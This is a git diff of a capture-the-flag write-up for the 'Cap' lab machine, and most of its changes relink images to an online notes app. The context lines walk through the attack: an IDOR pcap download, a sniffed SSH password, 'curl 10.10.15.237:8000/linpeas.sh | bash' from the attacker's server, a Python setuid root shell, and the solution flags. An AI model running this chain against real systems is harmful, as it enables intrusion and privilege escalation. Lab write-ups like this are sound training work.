@@ -4,10 +4,8 @@ title: Cap
 tags: []
 ---
 
-# Cap
-
-![image](../Images/Media/image.png)
-[image](../Images/image.md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image.png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/193804f3-2a5e-4aa6-88ba-b390ec446da3)
 
 ## NMAP SCAN
 
@@ -91,13 +89,13 @@ Nmap done: 1 IP address (1 host up) scanned in 28.41 seconds
 
 
 
-![image](../Images/Media/image%20(1).png)
-[image](../Images/image%20(1).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(1).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/6bac10aa-31e6-4e3e-a859-b1c3238bce15)
 
 ### Security Snapshot (5 Second PCAP + Analysis)
 
-![image](../Images/Media/image%20(2).png)
-[image](../Images/image%20(2).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(2).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/839c64b3-705b-43b6-8862-8266619baba0)
 
 #### IDOR
 
@@ -105,25 +103,25 @@ Nmap done: 1 IP address (1 host up) scanned in 28.41 seconds
 http://cap/data/0
 ```
 
-![image](../Images/Media/image%20(3).png)
-[image](../Images/image%20(3).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(3).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/95fefcff-c5d9-4fc7-bd55-aea943d4b950)
 
 Download file 0.pcap
 
-![image](../Images/Media/image%20(4).png)
-[image](../Images/image%20(4).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(4).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/a720265a-60fb-4949-b68b-96e0f1810753)
 
 
 ## Wireshark
 
-![image](../Images/Media/image%20(5).png)
-[image](../Images/image%20(5).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(5).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/7abfb256-6369-4e54-a48a-cda4205a29ec)
 
-![image](../Images/Media/image%20(6).png)
-[image](../Images/image%20(6).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(6).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/3308d0bc-bfda-4040-96fb-13d5244d8bb7)
 
-![image](../Images/Media/image%20(7).png)
-[image](../Images/image%20(7).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(7).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/e8fd44dd-5de8-4e1f-92da-bb8bddcdcb7f)
 
 Password: `Buck3tH4TF0RM3`
 
@@ -133,11 +131,11 @@ Password: `Buck3tH4TF0RM3`
 ssh nathan@10.10.10.245
 ```
 
-![image](../Images/Media/image%20(8).png)
-[image](../Images/image%20(8).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(8).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/1739cbe7-0829-4b6f-80a9-3b437f39e8cd)
 
-![image](../Images/Media/image%20(9).png)
-[image](../Images/image%20(9).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(9).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/578da34b-b554-48e2-bc8f-13490857a06a)
 
 First flag: `010d60c4f5812177e140f01a4388cf4a`
 
@@ -151,8 +149,8 @@ First flag: `010d60c4f5812177e140f01a4388cf4a`
 wget https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 ```
 
-![image](../Images/Media/image%20(10).png)
-[image](../Images/image%20(10).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(10).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/6ca759d9-d385-4f92-ac3c-17233ec47320)
 
 Send the file `linpeas.sh` to thetarget machine
 ​
@@ -161,8 +159,8 @@ Send the file `linpeas.sh` to thetarget machine
 python3 -m http.server
 ```
 
-![image](../Images/Media/image%20(11).png)
-[image](../Images/image%20(11).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(11).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/340fa665-aa17-4bbb-92f3-49ef897fbca7)
 
 ```bash
 wget 10.10.15.237:8000/linpeas.sh
@@ -170,23 +168,23 @@ wget 10.10.15.237:8000/linpeas.sh
 
 
 
-![image](../Images/Media/image%20(12).png)
-[image](../Images/image%20(12).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(12).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/b2c94363-705b-4497-ba14-ab6fdf2d60c1)
 
 ```bash
 curl 10.10.15.237:8000/linpeas.sh | bash
 ```
 
-![image](../Images/Media/image%20(13).png)
-[image](../Images/image%20(13).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(13).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/7448f119-c890-4445-99b5-f43e95e681a0)
 
-![image](../Images/Media/image%20(14).png)
-[image](../Images/image%20(14).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(14).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/6d416974-4e14-4ab1-b172-79fd3e7db0e0)
 
 [https://gtfobins.github.io/gtfobins/python/#capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)
 
-![image](../Images/Media/image%20(15).png)
-[image](../Images/image%20(15).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(15).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/1c4bbb01-e37e-455d-9d36-922240713f0c)
 
 ```bash
 Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
@@ -197,11 +195,11 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> os.system("/bin/bash")
 ```
 
-![image](../Images/Media/image%20(16).png)
-[image](../Images/image%20(16).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(16).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/675b5fdf-ef28-465c-aa91-9da6c80e1253)
 
-![image](../Images/Media/image%20(17).png)
-[image](../Images/image%20(17).md)
+![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(17).png)
+[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/d9450898-7fc4-47e0-8654-9b43f8379c4d)
 
 Second flag: `55f2ccfd78e10625d85cbbd696f7e64b`
 
